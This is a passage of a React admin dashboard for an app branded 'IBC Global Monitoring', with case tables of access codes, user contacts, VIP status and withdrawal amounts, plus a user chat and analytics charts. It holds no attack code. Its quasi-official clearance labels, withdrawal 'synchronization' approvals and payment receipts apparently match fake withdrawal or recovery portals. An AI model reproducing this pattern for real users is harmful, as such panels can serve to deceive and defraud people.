                 <Lock className="w-3 h-3" /> Restricted Access • ISO-D Level 1
              </div>
            </CardFooter>
          </Card>
        </motion.div>
      </div>
    );
  }

  // ADMIN DASHBOARD
  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 font-sans">
      <header className="bg-slate-950 border-b border-slate-800 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-3">
           <img src={ibcLogo} alt="Logo" className="h-8 w-8 opacity-80 grayscale" data-testid="img-logo" />
           <div>
             <h1 className="font-bold text-lg tracking-tight text-white">IBC GLOBAL MONITORING</h1>
             <div className="flex items-center gap-2 text-[10px] uppercase tracking-wider text-slate-400">
               <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
               System Active • ISO-D Clearance Level 1
             </div>
           </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="text-right hidden md:block">
            <p className="text-xs text-slate-400">Admin Session</p>
            <p className="text-sm font-bold text-white">Compliance Officer</p>
          </div>
          <Button
            variant="ghost"
            size="sm"
            className="text-slate-400 hover:text-white border border-slate-700 hover:border-slate-500"
            onClick={toggleTheme}
            data-testid="button-theme-toggle-admin"
          >
            {theme === 'dark' ? <Sun className="w-4 h-4" /> : <Moon className="w-4 h-4" />}
          </Button>
          <a href="/" target="_blank" rel="noopener noreferrer">
            <Button 
              variant="outline" 
              size="sm" 
              className="border-slate-700 bg-slate-800 text-slate-300 hover:text-white"
              data-testid="button-user-portal"
            >
              <ExternalLink className="w-4 h-4 mr-2" /> User Portal
            </Button>
          </a>
          <Button 
            variant="ghost" 
            size="sm" 
            className="text-slate-400 hover:text-white"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-4 h-4 mr-2" /> Logout
          </Button>
        </div>
      </header>

      <main className="p-6 max-w-7xl mx-auto">
        <Tabs defaultValue="cases" className="space-y-6">
          <TabsList className="bg-slate-800 border-slate-700">
            <TabsTrigger value="cases" className="data-[state=active]:bg-slate-700" data-testid="tab-cases">
              <FileText className="w-4 h-4 mr-2" /> Cases
            </TabsTrigger>
            <TabsTrigger value="submissions" className="data-[state=active]:bg-slate-700" data-testid="tab-submissions">
              <FolderOpen className="w-4 h-4 mr-2" /> All Submissions
            </TabsTrigger>
            <TabsTrigger value="conversations" className="data-[state=active]:bg-slate-700 relative" data-testid="tab-conversations">
              <MessageCircle className="w-4 h-4 mr-2" /> Conversations
              {totalUnread > 0 && (
                <span className="absolute -top-1 -right-1 h-5 w-5 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
                  {totalUnread}
                </span>
              )}
            </TabsTrigger>
            <TabsTrigger value="analytics" className="data-[state=active]:bg-slate-700" data-testid="tab-analytics">
              <BarChart3 className="w-4 h-4 mr-2" /> Analytics
            </TabsTrigger>
          </TabsList>

          <TabsContent value="cases">
            <div className="flex justify-between items-end mb-6">
              <div>
                <h2 className="text-2xl font-bold text-white mb-1">Case Management</h2>
                <p className="text-slate-400 text-sm">Manage secure access codes, edit letters, and approve synchronizations.</p>
              </div>
              <div className="flex gap-2">
                <Button onClick={() => setIsCreateOpen(true)} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-new-case">
                  <Plus className="w-4 h-4 mr-2" /> New Case
                </Button>
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="border-slate-700 bg-slate-800 text-slate-300 hover:text-white"
                  onClick={() => {
                    const escapeCSV = (val: string | null | undefined): string => {
                      if (val == null) return '""';
                      const str = String(val);
                      const escaped = str.replace(/"/g, '""').replace(/\n/g, ' ').replace(/\r/g, '');
                      return `"${escaped}"`;
                    };
                    
                    const headers = ['Access Code', 'Status', 'User Name', 'Email', 'Mobile', 'VIP Status', 'Withdrawal Amount', 'Batches', 'Created At'];
                    const csvContent = [
                      headers.map(h => escapeCSV(h)).join(','),
                      ...filteredCases.map(c => [
                        escapeCSV(c.accessCode),
                        escapeCSV(c.status),
                        escapeCSV(c.userName),
                        escapeCSV(c.userEmail),
                        escapeCSV(c.userMobile),
                        escapeCSV(c.vipStatus),
                        escapeCSV(c.withdrawalAmount),
                        escapeCSV(c.withdrawalBatches),
                        escapeCSV(new Date(c.createdAt).toLocaleDateString())
                      ].join(','))
                    ].join('\n');
                    
                    const blob = new Blob(['\ufeff' + csvContent], { type: 'text/csv;charset=utf-8;' });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = `cases-export-${new Date().toISOString().split('T')[0]}.csv`;
                    link.click();
                    toast({ title: "Export Complete", description: `Exported ${filteredCases.length} cases to CSV.` });
                  }}
                  data-testid="button-export-csv"
                >
                  <FileText className="w-4 h-4 mr-2" /> Export CSV
                </Button>
                <Button variant="destructive" size="sm" onClick={clearData} data-testid="button-clear">
                  <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
                </Button>
              </div>
            </div>

            {cases.some(c => c.status === 'syncing') && (
              <div className="mb-6 bg-amber-500/10 border border-amber-500/20 rounded-lg p-4 flex items-center justify-between">
                <div className="flex items-center gap-3 text-amber-500">
                  <ShieldAlert className="w-6 h-6 animate-pulse" />
                  <div>
                    <h3 className="font-bold">Action Required</h3>
                    <p className="text-sm opacity-80">There are users waiting for synchronization approval.</p>
                  </div>
                </div>
              </div>
            )}

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <CardHeader className="border-b border-slate-800 bg-slate-900/50 py-4">
                 <div className="flex flex-col gap-4">
                   <div className="flex justify-between items-center">
                     <CardTitle className="text-base font-medium text-white">Active Cases</CardTitle>
                     <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300" onClick={() => loadData(true)} data-testid="button-refresh">
                       <RefreshCw className="w-4 h-4 mr-2" /> Refresh
                     </Button>
                   </div>
                   
                   {/* Search and Filter Row */}
                   <div className="flex flex-col sm:flex-row gap-3">
                     <div className="relative flex-1">
                       <input
                         type="text"
                         placeholder="Search by code, name, or email..."
                         value={searchQuery}
                         onChange={(e) => setSearchQuery(e.target.value)}
                         className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-2 pl-10 text-sm text-white placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500"
                         data-testid="input-search-cases"
                       />
                       <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                       </svg>
                       {searchQuery && (
                         <button
                           onClick={() => setSearchQuery("")}
                           className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300"
                         >
                           <X className="w-4 h-4" />
                         </button>
                       )}
                     </div>
                     
                     <Select value={statusFilter} onValueChange={setStatusFilter}>
                       <SelectTrigger className="w-full sm:w-[180px] bg-slate-900 border-slate-700 text-white" data-testid="select-status-filter">
                         <SelectValue placeholder="Filter by status" />
                       </SelectTrigger>
                       <SelectContent className="bg-slate-900 border-slate-700">
                         <SelectItem value="all" className="text-white hover:bg-slate-800">All Statuses</SelectItem>
                         <SelectItem value="created" className="text-white hover:bg-slate-800">Created</SelectItem>
                         <SelectItem value="syncing" className="text-white hover:bg-slate-800">Syncing</SelectItem>
                         <SelectItem value="active" className="text-white hover:bg-slate-800">Active</SelectItem>
                         <SelectItem value="completed" className="text-white hover:bg-slate-800">Completed</SelectItem>
                       </SelectContent>
                     </Select>
                   </div>
                   
                   {/* Results count */}
                   <div className="text-xs text-slate-500">
                     Showing {filteredCases.length} of {cases.length} cases
                     {(searchQuery || statusFilter !== 'all') && (
                       <button 
                         onClick={() => { setSearchQuery(""); setStatusFilter("all"); }}
                         className="ml-2 text-blue-400 hover:text-blue-300"
                       >
                         Clear filters
                       </button>
                     )}
                   </div>
                 </div>
              </CardHeader>
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400 w-[100px]">Status</TableHead>
                      <TableHead className="text-slate-400">Access Code</TableHead>
                      <TableHead className="text-slate-400">User Identity</TableHead>
                      <TableHead className="text-slate-400">Contact</TableHead>
                      <TableHead className="text-slate-400 text-center">Submissions</TableHead>
                      <TableHead className="text-slate-400 text-center">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {isDataLoading ? (
                      [...Array(3)].map((_, i) => (
                        <TableRow key={i} className="hover:bg-transparent border-slate-800 animate-pulse">
                          <TableCell><div className="h-5 w-20 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-24 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-32 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-28 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-16 bg-slate-800 rounded mx-auto"></div></TableCell>
                          <TableCell><div className="h-8 w-24 bg-slate-800 rounded mx-auto"></div></TableCell>
                        </TableRow>
                      ))
                    ) : filteredCases.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={6} className="text-center py-12 text-slate-500">
                          {cases.length === 0 
                            ? "No active cases. Create one to get started."
                            : "No cases match your search criteria."}
                        </TableCell>
                      </TableRow>
                    ) : (
                      filteredCases.map((c) => (
                        <TableRow key={c.id} className="hover:bg-slate-900/50 border-slate-800 group" data-testid={`row-case-${c.id}`}>
                          <TableCell>
                            <Badge variant="outline" className={`
                              ${c.status === 'created' ? 'text-slate-400 border-slate-700' : ''}
                              ${c.status === 'registered' ? 'text-blue-400 border-blue-700 bg-blue-500/10' : ''}
                              ${c.status === 'syncing' ? 'text-amber-400 border-amber-700 bg-amber-500/10 animate-pulse' : ''}
                              ${c.status === 'active' ? 'text-green-400 border-green-700 bg-green-500/10' : ''}
                              ${c.status === 'completed' ? 'text-purple-400 border-purple-700 bg-purple-500/10' : ''}
                            `}>
                              {c.status.toUpperCase()}
                            </Badge>
                          </TableCell>
                          <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
                          <TableCell className="text-slate-300">
                            {c.userName ? (
                               <div className="font-medium text-white">{c.userName}</div>
                            ) : (
                              <span className="text-slate-600 italic">Pending Login...</span>
                            )}
                          </TableCell>
                          <TableCell className="text-slate-400 text-sm">
                            {c.userEmail ? (
                              <div className="flex flex-col">
                                <span>{c.userEmail}</span>
                                <span className="text-xs opacity-70">{c.userMobile}</span>
                              </div>
                            ) : (
                              "-"
                            )}
                          </TableCell>
                          <TableCell className="text-center">
                            <Badge variant="outline" className="text-slate-400 border-slate-700">
                              {getCaseSubmissionCount(c.id)} submissions
                            </Badge>
                          </TableCell>
                          <TableCell>
                            <div className="flex justify-center gap-2">
                              {c.status === 'syncing' && (
                                <Button 
                                  size="sm" 
                                  className="bg-amber-600 hover:bg-amber-700 text-white"
                                  onClick={() => openFinalizeModal(c)}
                                  data-testid={`button-finalize-${c.id}`}
                                >
                                  <UserCheck className="w-4 h-4 mr-1" /> Finalize
                                </Button>
                              )}
                              {(c.status === 'active' || c.status === 'syncing') && (
                                <>
                                  <Button 
                                    size="sm" 
                                    variant="outline"
                                    className="border-slate-700 bg-slate-800"
                                    onClick={() => openLetterEditor(c)}
                                    data-testid={`button-edit-letter-${c.id}`}
                                  >
                                    <Edit3 className="w-4 h-4 mr-1" /> Letter
                                  </Button>
                                  <Button 
                                    size="sm" 
                                    variant="outline"
                                    className={c.letterSent 
                                      ? "border-green-700 bg-green-900/50 text-green-400 hover:bg-green-800" 
                                      : "border-slate-600 bg-slate-800/50 text-slate-400 hover:bg-slate-700"
                                    }
                                    onClick={() => toggleLetterSent(c)}
                                    data-testid={`button-send-letter-${c.id}`}
                                  >
                                    {c.letterSent ? (
                                      <><MailCheck className="w-4 h-4 mr-1" /> Sent</>
                                    ) : (
                                      <><Mail className="w-4 h-4 mr-1" /> Send</>
                                    )}
                                  </Button>
                                </>
                              )}
                              {getCaseSubmissionCount(c.id) > 0 && (
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  className="border-slate-700 bg-slate-800"
                                  onClick={() => openSubmissionsModal(c)}
                                  data-testid={`button-view-submissions-${c.id}`}
                                >
                                  <History className="w-4 h-4 mr-1" /> History
                                </Button>
                              )}
                              {c.status !== 'created' && (
                                <>
                                  <Button 
                                    size="sm" 
                                    variant="outline"
                                    className="border-blue-700 bg-blue-900/50 text-blue-400 hover:bg-blue-800 relative"
                                    onClick={() => openChat(c)}
                                    data-testid={`button-chat-${c.id}`}
                                  >
                                    <MessageCircle className="w-4 h-4 mr-1" /> Chat
                                    {unreadCounts[c.id] > 0 && (
                                      <span className="absolute -top-1 -right-1 h-4 w-4 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
                                        {unreadCounts[c.id]}
                                      </span>
                                    )}
                                  </Button>
                                  <Button 
                                    size="sm" 
                                    variant="outline"
                                    className="border-purple-700 bg-purple-900/50 text-purple-400 hover:bg-purple-800"
                                    onClick={() => openAdminMessageDialog(c)}
                                    data-testid={`button-manage-${c.id}`}
                                  >
                                    <Bell className="w-4 h-4 mr-1" /> Manage
                                  </Button>
                                  <Button 
                                    size="sm" 
                                    variant="outline"
                                    className="border-amber-700 bg-amber-900/50 text-amber-400 hover:bg-amber-800"
                                    onClick={() => openReceiptsDialog(c)}
                                    data-testid={`button-receipts-${c.id}`}
                                  >
                                    <Image className="w-4 h-4 mr-1" /> Receipts
                                  </Button>
                                </>
                              )}
                            </div>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>

          <TabsContent value="submissions">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-white mb-1">All Submissions</h2>
              <p className="text-slate-400 text-sm">View all user submissions across all cases.</p>
            </div>

            <Card className="bg-slate-950 border-slate-800 overflow-hidden">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader className="bg-slate-900">
                    <TableRow className="hover:bg-slate-900 border-slate-800">
                      <TableHead className="text-slate-400">Date</TableHead>
                      <TableHead className="text-slate-400">User</TableHead>
                      <TableHead className="text-slate-400">Email</TableHead>
                      <TableHead className="text-slate-400">Option</TableHead>
                      <TableHead className="text-slate-400">Amount</TableHead>
                      <TableHead className="text-slate-400">Batches</TableHead>
                      <TableHead className="text-slate-400 text-center">Action</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {isDataLoading ? (
                      [...Array(3)].map((_, i) => (
                        <TableRow key={i} className="hover:bg-transparent border-slate-800 animate-pulse">
                          <TableCell><div className="h-5 w-28 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-24 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-32 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-16 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-20 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-5 w-12 bg-slate-800 rounded"></div></TableCell>
                          <TableCell><div className="h-8 w-8 bg-slate-800 rounded mx-auto"></div></TableCell>
                        </TableRow>
                      ))
                    ) : allSubmissions.length === 0 ? (
                      <TableRow className="hover:bg-transparent border-slate-800">
                        <TableCell colSpan={7} className="text-center py-12 text-slate-500">
                          No submissions yet.
                        </TableCell>
                      </TableRow>
                    ) : (
                      allSubmissions.map((s) => (
                        <TableRow key={s.id} className="hover:bg-slate-900/50 border-slate-800" data-testid={`row-submission-${s.id}`}>
                          <TableCell className="text-slate-300 text-sm">
                            {new Date(s.submittedAt).toLocaleString()}
                          </TableCell>
                          <TableCell className="text-white font-medium">{s.userName || "-"}</TableCell>
                          <TableCell className="text-slate-400 text-sm">{s.userEmail || "-"}</TableCell>
                          <TableCell>
                            <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                              Option {s.selectedOption}
                            </Badge>
                          </TableCell>
                          <TableCell className="text-green-400 font-medium">{s.withdrawalAmount || "-"}</TableCell>
                          <TableCell className="text-slate-300">{s.withdrawalBatches || "-"}</TableCell>
                          <TableCell className="text-center">
                            <Button 
                              size="sm" 
                              variant="ghost"
                              className="text-red-400 hover:text-red-300 hover:bg-red-500/10"
                              onClick={() => handleDeleteSubmission(s.id)}
                              data-testid={`button-delete-submission-${s.id}`}
                            >
                              <X className="w-4 h-4" />
                            </Button>
                          </TableCell>
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>
          </TabsContent>

          {/* Conversations Tab */}
          <TabsContent value="conversations">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-white mb-1">User Conversations</h2>
              <p className="text-slate-400 text-sm">View and respond to user messages in real-time.</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Conversation List */}
              <Card className="bg-slate-950 border-slate-800 lg:col-span-1">
                <CardHeader className="border-b border-slate-800 py-3">
                  <CardTitle className="text-base text-white">Active Chats</CardTitle>
                </CardHeader>
                <ScrollArea className="h-[300px] lg:h-[500px]">
                  <div className="p-2">
                    {cases.filter(c => c.userName).map((c) => (
                      <div
                        key={c.id}
                        className={`p-3 rounded-lg cursor-pointer mb-2 transition-colors ${
                          chatCase?.id === c.id 
                            ? 'bg-blue-600/20 border border-blue-500/50' 
                            : 'bg-slate-900/50 hover:bg-slate-800 border border-transparent'
                        }`}
                        onClick={() => {
                          setChatCase(c);
                          loadChatMessages(c.id);
                        }}
                        data-testid={`chat-user-${c.id}`}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-full bg-slate-700 flex items-center justify-center">
                              <User className="w-5 h-5 text-slate-400" />
                            </div>
                            <div>
                              <p className="text-white font-medium text-sm">{c.userName}</p>
                              <p className="text-slate-500 text-xs">{c.accessCode}</p>
                            </div>
                          </div>
                          {unreadCounts[c.id] > 0 && (
                            <Badge className="bg-red-500 text-white animate-pulse">
                              {unreadCounts[c.id]}
                            </Badge>
                          )}
                        </div>
                      </div>
                    ))}
                    {cases.filter(c => c.userName).length === 0 && (
                      <div className="text-center py-8 text-slate-500">
                        <MessageCircle className="w-8 h-8 mx-auto mb-2 opacity-50" />
                        <p className="text-sm">No active conversations</p>
                      </div>
                    )}
                  </div>
                </ScrollArea>
              </Card>

              {/* Chat Window */}
              <Card className="bg-slate-950 border-slate-800 lg:col-span-2">
                {chatCase ? (
                  <>
                    <CardHeader className="border-b border-slate-800 py-3">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center">
                            <User className="w-5 h-5 text-white" />
                          </div>
                          <div>
                            <CardTitle className="text-base text-white">{chatCase.userName}</CardTitle>
                            <p className="text-xs text-slate-400">{chatCase.userEmail}</p>
                          </div>
                        </div>
                        <Badge variant="outline" className="text-slate-400 border-slate-700">
                          {chatCase.accessCode}
                        </Badge>
                      </div>
                    </CardHeader>
                    <div ref={chatScrollRef} className="h-[250px] lg:h-[350px] overflow-y-auto p-4 space-y-3 bg-slate-900/30">
                      {chatMessages.length === 0 ? (
                        <div className="text-center text-slate-500 mt-12">
                          <MessageCircle className="h-12 w-12 mx-auto text-slate-700 mb-3" />
                          <p className="text-sm">No messages yet</p>
                        </div>
                      ) : (
                        chatMessages.map((msg) => (
                          <div
                            key={msg.id}
                            className={`flex ${msg.sender === 'admin' ? 'justify-end' : 'justify-start'}`}
                          >
                            <div
                              className={`max-w-[70%] px-4 py-2 rounded-2xl ${
                                msg.sender === 'admin'
                                  ? 'bg-blue-600 text-white rounded-br-md'
                                  : 'bg-slate-800 text-slate-100 rounded-bl-md'
                              }`}
                            >
                              <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
                              <p className={`text-xs mt-1 ${msg.sender === 'admin' ? 'text-blue-200' : 'text-slate-500'}`}>
                                {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                              </p>
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                    <CardFooter className="border-t border-slate-800 p-3">
                      <div className="flex gap-2 w-full">
                        <Input
                          placeholder="Type your message..."
                          value={newMessage}
                          onChange={(e) => setNewMessage(e.target.value)}
                          onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendChatMessage()}
                          disabled={isSendingMessage}
                          className="flex-1 bg-slate-900 border-slate-700 text-white"
                          data-testid="input-admin-chat"
                        />
                        <Button
                          onClick={sendChatMessage}
                          disabled={!newMessage.trim() || isSendingMessage}
                          className="bg-blue-600 hover:bg-blue-700"
                          data-testid="button-send-admin-chat"
                        >
                          <Send className="h-4 w-4" />
                        </Button>
                      </div>
                    </CardFooter>
                  </>
                ) : (
                  <div className="h-[300px] lg:h-[500px] flex items-center justify-center text-slate-500">
                    <div className="text-center">
                      <MessageCircle className="w-16 h-16 mx-auto mb-4 opacity-30" />
                      <p className="text-lg font-medium">Select a conversation</p>
                      <p className="text-sm">Choose a user from the list to start chatting</p>
                    </div>
                  </div>
                )}
              </Card>
            </div>
          </TabsContent>

          {/* Analytics Tab */}
          <TabsContent value="analytics">
            <div className="mb-6">
              <h2 className="text-2xl font-bold text-white mb-1">Analytics Dashboard</h2>
              <p className="text-slate-400 text-sm">Monitor key metrics, trends, and performance indicators.</p>
            </div>

            {/* Summary Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
                <Card className="bg-gradient-to-br from-blue-500/20 to-blue-600/10 border-blue-500/30">
                  <CardContent className="pt-6">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-blue-200 text-sm">Total Cases</p>
                        <p className="text-3xl font-bold text-white">{cases.length}</p>
                      </div>
                      <div className="h-12 w-12 bg-blue-500/20 rounded-lg flex items-center justify-center">
                        <FileText className="h-6 w-6 text-blue-400" />
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>

              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
                <Card className="bg-gradient-to-br from-green-500/20 to-green-600/10 border-green-500/30">
                  <CardContent className="pt-6">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-green-200 text-sm">Active Users</p>
                        <p className="text-3xl font-bold text-white">{cases.filter(c => c.status === 'active' || c.status === 'completed').length}</p>
                      </div>
                      <div className="h-12 w-12 bg-green-500/20 rounded-lg flex items-center justify-center">
                        <Users className="h-6 w-6 text-green-400" />
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>

              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
                <Card className="bg-gradient-to-br from-purple-500/20 to-purple-600/10 border-purple-500/30">
                  <CardContent className="pt-6">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-purple-200 text-sm">Total Submissions</p>
                        <p className="text-3xl font-bold text-white">{allSubmissions.length}</p>
                      </div>
                      <div className="h-12 w-12 bg-purple-500/20 rounded-lg flex items-center justify-center">
                        <FolderOpen className="h-6 w-6 text-purple-400" />
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>

              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
                <Card className="bg-gradient-to-br from-amber-500/20 to-amber-600/10 border-amber-500/30">
                  <CardContent className="pt-6">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-amber-200 text-sm">Pending Actions</p>
                        <p className="text-3xl font-bold text-white">{cases.filter(c => c.status === 'syncing').length}</p>
                      </div>
                      <div className="h-12 w-12 bg-amber-500/20 rounded-lg flex items-center justify-center">
                        <Clock className="h-6 w-6 text-amber-400" />
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>
            </div>

            {/* Charts Row */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
              {/* Case Status Distribution */}
              <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.5 }}>
                <Card className="bg-slate-950 border-slate-800">
                  <CardHeader>
                    <CardTitle className="text-white flex items-center gap-2">
                      <BarChart3 className="h-5 w-5 text-blue-400" />
                      Case Status Distribution
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="h-[300px]">
                      <ResponsiveContainer width="100%" height="100%">
                        <PieChart>
                          <Pie
                            data={[
                              { name: 'Created', value: cases.filter(c => c.status === 'created').length, color: '#64748b' },
                              { name: 'Syncing', value: cases.filter(c => c.status === 'syncing').length, color: '#f59e0b' },
                              { name: 'Active', value: cases.filter(c => c.status === 'active').length, color: '#22c55e' },
                              { name: 'Completed', value: cases.filter(c => c.status === 'completed').length, color: '#3b82f6' },
                            ].filter(d => d.value > 0)}
                            cx="50%"
                            cy="50%"
                            labelLine={false}
                            label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                            outerRadius={100}
                            fill="#8884d8"
                            dataKey="value"
                          >
                            {[
                              { name: 'Created', value: cases.filter(c => c.status === 'created').length, color: '#64748b' },
                              { name: 'Syncing', value: cases.filter(c => c.status === 'syncing').length, color: '#f59e0b' },
                              { name: 'Active', value: cases.filter(c => c.status === 'active').length, color: '#22c55e' },
                              { name: 'Completed', value: cases.filter(c => c.status === 'completed').length, color: '#3b82f6' },
                            ].filter(d => d.value > 0).map((entry, index) => (
                              <Cell key={`cell-${index}`} fill={entry.color} />
                            ))}
                          </Pie>
                          <Tooltip 
                            contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155', borderRadius: '8px' }}
                            labelStyle={{ color: '#fff' }}
                          />
                          <Legend 
                            wrapperStyle={{ color: '#94a3b8' }}
                            formatter={(value) => <span style={{ color: '#94a3b8' }}>{value}</span>}
                          />
                        </PieChart>
                      </ResponsiveContainer>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>

              {/* Submission Options Breakdown */}
              <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.6 }}>
                <Card className="bg-slate-950 border-slate-800">
                  <CardHeader>
                    <CardTitle className="text-white flex items-center gap-2">
                      <TrendingUp className="h-5 w-5 text-green-400" />
                      Submission Options Breakdown
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="h-[300px]">
                      <ResponsiveContainer width="100%" height="100%">
                        <BarChart
                          data={[
                            { name: 'Option A', count: allSubmissions.filter(s => s.selectedOption === 'A').length, fill: '#3b82f6' },
                            { name: 'Option B', count: allSubmissions.filter(s => s.selectedOption === 'B').length, fill: '#8b5cf6' },
                          ]}
                          margin={{ top: 20, right: 30, left: 20, bottom: 5 }}
                        >
                          <CartesianGrid strokeDasharray="3 3" stroke="#334155" />
                          <XAxis dataKey="name" stroke="#94a3b8" />
                          <YAxis stroke="#94a3b8" />
                          <Tooltip 
                            contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155', borderRadius: '8px' }}
                            labelStyle={{ color: '#fff' }}
                          />
                          <Bar dataKey="count" radius={[4, 4, 0, 0]}>
                            {[
                              { name: 'Option A', count: allSubmissions.filter(s => s.selectedOption === 'A').length, fill: '#3b82f6' },
                              { name: 'Option B', count: allSubmissions.filter(s => s.selectedOption === 'B').length, fill: '#8b5cf6' },
                            ].map((entry, index) => (
                              <Cell key={`cell-${index}`} fill={entry.fill} />
                            ))}
                          </Bar>
                        </BarChart>
                      </ResponsiveContainer>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>
            </div>

            {/* Activity Timeline */}
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.7 }}>
              <Card className="bg-slate-950 border-slate-800">
                <CardHeader>
                  <CardTitle className="text-white flex items-center gap-2">
                    <Activity className="h-5 w-5 text-purple-400" />
                    Recent Activity
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {cases.slice(0, 5).map((c, index) => (
                      <motion.div 
                        key={c.id}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: 0.1 * index }}
                        className="flex items-center gap-4 p-3 bg-slate-900/50 rounded-lg border border-slate-800"
                      >
                        <div className={`h-10 w-10 rounded-full flex items-center justify-center ${
                          c.status === 'completed' ? 'bg-blue-500/20' :
                          c.status === 'active' ? 'bg-green-500/20' :
                          c.status === 'syncing' ? 'bg-amber-500/20' : 'bg-slate-500/20'
                        }`}>
                          {c.status === 'completed' ? <CheckCircle className="h-5 w-5 text-blue-400" /> :
                           c.status === 'active' ? <User className="h-5 w-5 text-green-400" /> :
                           c.status === 'syncing' ? <Clock className="h-5 w-5 text-amber-400" /> :
                           <FileText className="h-5 w-5 text-slate-400" />}
                        </div>
                        <div className="flex-1">
                          <p className="text-white font-medium">{c.userName || `Case ${c.accessCode}`}</p>
                          <p className="text-slate-400 text-sm">
                            Status: <span className={`font-medium ${
                              c.status === 'completed' ? 'text-blue-400' :
                              c.status === 'active' ? 'text-green-400' :
                              c.status === 'syncing' ? 'text-amber-400' : 'text-slate-300'
                            }`}>{c.status}</span>
                          </p>
                        </div>
                        <div className="text-right">
                          <p className="text-slate-500 text-xs">
                            {new Date(c.updatedAt || c.createdAt).toLocaleDateString()}
                          </p>
                          <p className="text-slate-600 text-xs">
                            {new Date(c.updatedAt || c.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </p>
                        </div>
                      </motion.div>
                    ))}
                    {cases.length === 0 && (
